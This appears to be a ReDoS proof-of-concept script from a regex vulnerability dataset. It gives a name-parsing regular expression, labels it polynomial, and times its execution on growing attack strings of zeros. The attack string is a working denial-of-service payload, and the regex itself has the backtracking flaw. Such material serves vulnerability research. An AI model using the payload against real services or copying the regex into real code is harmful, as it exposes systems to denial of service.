/* 7178
 * (^\s*((?!st\.?\s+)\w+\S*)\s+((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+[^, ]*)(?:(,| ))*\s+(\w+\S*)\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s+((jr)|(sr)|(ii)|(iii)||(iv)|(v)|(vi)|(vii)|(viii))\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s*$)|(^\s*((st\.?\s+)?\w+\S*)\s*$)
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:"1 1 "+"0"*5000+"!_1_POA(i)"
 */
var REGEX = /(^\s*((?!st\.?\s+)\w+\S*)\s+((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+[^, ]*)(?:(,| ))*\s+(\w+\S*)\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s+((jr)|(sr)|(ii)|(iii)||(iv)|(v)|(vi)|(vii)|(viii))\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s*$)|(^\s*((?!st\.?\s+)\w+\S*)\s+((st\.?\s+)?\w+\S*)\s*$)|(^\s*((st\.?\s+)?\w+\S*)\s*$)/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '1 1 ' + '0'.repeat(i*10000) + '!_1_POA(i)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}